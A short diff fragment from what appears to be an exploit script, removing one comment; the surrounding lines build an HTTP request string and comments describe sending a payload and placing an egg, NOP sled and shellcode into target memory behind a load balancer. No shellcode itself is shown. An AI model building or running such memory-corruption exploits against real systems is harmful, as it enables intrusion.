@@ -108,7 +108,6 @@ stage2 += " HTTP/1.1 \r\nHost: " + host + ":" + port + "\r\n\r\n"
 # Send Payload and exploit
 # -----------------------------------------------------------
 
-# Sending 10 Requests to fill target memory --
 # Load balancer with 8 instances running --
 # modify request as needed.
 # Egg / Nops / Shellcode into target mem -- 
